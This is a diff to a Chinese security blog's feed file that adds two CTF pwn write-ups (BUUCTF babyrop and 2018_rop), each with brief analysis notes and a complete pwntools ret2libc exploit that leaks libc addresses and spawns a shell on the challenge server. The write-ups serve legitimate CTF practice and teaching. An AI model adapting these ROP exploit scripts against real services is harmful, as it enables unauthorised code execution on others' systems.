@@ -58,6 +58,60 @@
     
     
     <entry>
+      <title>BUUCTF-PWN-bjdctf_2020_babyrop</title>
+      <link href="/20220118-ctf-babyrop/"/>
+      <url>/20220118-ctf-babyrop/</url>
+      
+        <content type="html"><![CDATA[<h1 id="BUUCTF-PWN-bjdctf-2020-babyrop"><a href="#BUUCTF-PWN-bjdctf-2020-babyrop" class="headerlink" title="BUUCTF-PWN-bjdctf_2020_babyrop"></a>BUUCTF-PWN-bjdctf_2020_babyrop</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202201182140064.png" alt="image-20220118214029208"></p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202201182141341.png" alt="image-20220118214114841"></p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202201182141841.png" alt="image-20220118214136629"></p><p>又是基本的ret2libc</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202201182145741.png" alt="image-20220118214513048"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25135</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./bjdctf_2020_babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rdi_ret = <span class="number">0x400733</span></span><br><span class="line">ret = <span class="number">0x4004c9</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">0x8</span>) + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;story!\n&#x27;</span>, payload1)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">0x8</span>) + p64(ret) + p64(rdi_ret) + p64(binsh) + p64(sys_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;story!\n&#x27;</span>, payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202201182146383.png" alt="image-20220118214615820"></p><p>0号就是正确的</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202201182146507.png" alt="image-20220118214641081"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> PWN </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>BUUCTF-PWN-铁人三项(第五赛区)_2018_rop</title>
+      <link href="/20220118-ctf-2018_rop/"/>
+      <url>/20220118-ctf-2018_rop/</url>
+      
+        <content type="html"><![CDATA[<h1 id="BUUCTF-PWN-铁人三项-第五赛区-2018-rop"><a href="#BUUCTF-PWN-铁人三项-第五赛区-2018-rop" class="headerlink" title="BUUCTF-PWN-铁人三项(第五赛区)_2018_rop"></a>BUUCTF-PWN-铁人三项(第五赛区)_2018_rop</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202201181923009.png" alt="image-20220118192304049"></p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202201181924608.png" alt="image-20220118192407544"></p><p><code>be_nice_to_people</code>函数不知道在干什么，这道题好像也不需要管</p><p><code>vulnerable_function</code>函数中有一个溢出点</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202201181929886.png" alt="image-20220118192901402"></p><p>所以这题的思路是用<code>write</code>函数来计算<code>system</code>函数和<code>binsh</code>的地址</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29883</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./2018_rop&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_addr))</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendline(flat(<span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>), p32(write_plt), p32(main_addr), p32(<span class="number">1</span>), p32(write_got), p32(<span class="number">4</span>)))</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil(&#x27;Hello, World\n&#x27;)</span></span><br><span class="line">p.sendline(flat(<span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>), p32(system_addr), p32(main_addr), p32(binsh_addr)))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202201181935903.png" alt="image-20220118193516384"></p><p>从上往下尝试，0不行，到1的时候就可以了</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202201181935927.png" alt="image-20220118193554495"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> PWN </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>XCTF-PWN-monkey</title>
       <link href="/20220117-ctf-monkey/"/>
       <url>/20220117-ctf-monkey/</url>
